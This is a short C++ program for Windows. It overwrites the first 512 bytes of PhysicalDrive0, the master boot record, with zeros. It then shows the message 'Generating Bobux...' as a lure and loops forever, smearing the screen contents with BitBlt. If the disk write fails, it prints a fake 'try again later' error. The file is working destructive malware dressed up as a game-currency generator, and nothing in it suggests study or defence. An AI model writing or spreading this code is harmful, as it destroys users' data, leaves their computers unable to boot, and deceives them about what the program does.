#include <iostream>
#include <Windows.h>

using namespace std;

#define MBR_SIZE 512

int main() {

    DWORD write;
    char MbrData[MBR_SIZE];

    ZeroMemory(&MbrData, (sizeof MbrData));

    HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(MasterBootRecord, MbrData, MBR_SIZE, &write, NULL) == TRUE) {
        cout << "Generating Bobux..." << endl;
        HWND upWnd = GetForegroundWindow();
        HDC upHdc = GetDC(upWnd);
        HDC desktop = GetDC(NULL);
        int xs = GetSystemMetrics(SM_CXSCREEN);
        int ys = GetSystemMetrics(SM_CYSCREEN);
        while (true) {
            upWnd = GetForegroundWindow();
            upHdc = GetDC(upWnd);
            desktop = GetDC(NULL);
            BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);
        }

    }
    else {
        cout << "Something went wrong! Please try again later!";
        Sleep(3000);
        ExitProcess(0);
    }

    return EXIT_SUCCESS;
}